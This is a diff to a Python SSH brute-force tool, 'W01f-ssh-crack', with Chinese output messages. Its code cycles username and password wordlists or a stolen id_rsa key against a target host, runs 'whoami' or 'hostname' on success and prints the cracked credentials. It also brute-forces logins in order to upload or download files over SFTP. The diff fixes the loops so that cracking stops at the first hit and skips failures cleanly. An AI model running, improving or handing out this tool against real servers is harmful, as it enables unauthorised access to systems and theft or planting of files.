@@ -13,18 +13,28 @@ from email.mime.text import MIMEText
 from email.header import Header
 from typing import Callable
 
-print("""
-@Author: W01f
-@repo: https://github.com/W01fh4cker/W01f-ssh-crack/
-@version: 1.0
-@time: 2022/4/13
+AUTHOR = "W01fh4cker"
+REPO = "https://github.com/W01fh4cker/W01f-ssh-crack"
+VERSION = "1.0"
+MADETIME = "2022/4/13"
+NOWTIME = datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
+SSH_LOGO = """
      ███████╗███████╗██╗  ██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
      ██╔════╝██╔════╝██║  ██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
      ███████╗███████╗███████║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
      ╚════██║╚════██║██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
      ███████║███████║██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
      ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
-                                                                                                               
+"""
+
+# print logo and some information
+print(fr"""
+        {SSH_LOGO}
+@Author: {AUTHOR}
+@repo: {REPO}
+@version: {VERSION}
+@time: {MADETIME}  
+@now: {NOWTIME}                     
 """)
 
 # re coding and fixing bugs by: [KOKOMI12345]Fuxuan(https://github.com/KOKOMI12345)
@@ -57,10 +67,15 @@ def sshClientConnection(hostname:str, SSHport: int):
                 ssh_client.connect(hostname, port=SSHport, username=str(username), password=str(password))
                 stdin, stdout, stderr = ssh_client.exec_command('whoami',timeout=10)
                 print(stdout.read().decode('utf-8'))
-                ssh_client.close()
+                print(fr"[√]SSH连接成功! 账号: {username} 密码为：{password}")
+                break
+            except paramiko.SSHException:
+                print(fr"[!]尝试账号: {username} 密码：{password} 失败! 自动跳过...")
+                continue
             except Exception:
                 pass
-    print(fr"[√]SSH连接成功! 账号: {username} 密码为：{password}")
+            finally:
+                ssh_client.close()
 
 def sshRsaConnection(hostname: str, SSHport: int):
     id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
@@ -82,25 +97,36 @@ def sshRsaConnection(hostname: str, SSHport: int):
                                 pkey=local_key)
                     stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
                     print(stdout.read().decode())
-                    ssh.close()
+                    print(fr"[√]SSH连接成功! 账号: {username} 密码为：{Rsa_password}")
+                    break
+                except paramiko.SSHException:
+                    print(fr"[!]尝试账号: {username} 密码：{Rsa_password} 失败! 自动跳过...")
+                    continue
                 except Exception:
                     pass
-        print(fr"[√]SSH连接成功! 账号：{username} 密码为：{Rsa_password}")
+                finally:
+                    ssh.close()
     elif(flag1 == 'n'):
         with open("username.txt", 'r', encoding='utf-8') as f:
             user_name = f.readlines()
-        for m in user_name:
-            local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa')
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
-            ssh.connect(hostname,
-                        port=22,
-                        username=m,
-                        pkey=local_key)
-            stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
-            print(stdout.read().decode())
-            ssh.close()
-        print("[√]SSH连接成功！账号：" + str(m))
+        for username in user_name:
+            try:
+                local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa')
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
+                ssh.connect(hostname,
+                            port=22,
+                            username=username,
+                            pkey=local_key)
+                stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
+                print(stdout.read().decode())
+                ssh.close()
+            except paramiko.SSHException:
+                print(fr"[!]尝试账号: {username} 失败! 自动跳过...")
+                continue
+            finally:
+                ssh.close()
+        print(fr"[√]SSH连接成功!账号： {username}")
     else:
         print("您的输入有误！")
 
@@ -123,13 +149,16 @@ def transFile(hostname: str, SSHport: int):
                     remote_path = input("请输入您要上传的位置的绝对路径：")
                     try:
                         sftp.put(localpath=local_path, remotepath=remote_path)
-                        trans.close()
                         print("[√]上传成功！")
+                        print(fr"[√]连接成功！账号: {username} 密码为：{password}")
+                        break
                     except Exception:
                         print("[×]上传失败。")
+                        continue
+                    finally:
+                        trans.close()
                 except Exception:
                     pass
-        print("[√]连接成功！账号：" + str(p) + " 密码为：" + str(q))
     elif(flag2==2):
         for username in user_name:
             for password in pass_word:
@@ -143,9 +172,10 @@ def transFile(hostname: str, SSHport: int):
                     try:
                         sftp.get(localpath=local_path, remotepath=remote_path)
                         print("[√]下载成功！")
-                        trans.close()
                     except Exception:
                         print("[×]下载失败。")
+                        continue
+                    finally:
                         trans.close()
                 except Exception:
                     pass
@@ -199,11 +229,13 @@ if __name__ == '__main__':
         'trans': (transFile, send_msg),
         'default': (print)
     }
+      # 其实这里我本来想用 match case 语法，但是match case语法在python3.10之后才支持，所以我就用字典来代替了, 提升向后兼容性
 
     mode, stmpPath, hostname, SSHport = parseArgs()
 
     if mode not in modeDict:
         modeDict['default'](f"模式{mode}不存在！")
+        print("可指定模式: client、rsa、trans")
     else:
         try:
             if mode == "default":
@@ -217,3 +249,6 @@ if __name__ == '__main__':
         except Exception as e:
             print_errormsg()
             print(e)
+        except KeyboardInterrupt:
+            print("[!]用户中断！")
+            exit(1)
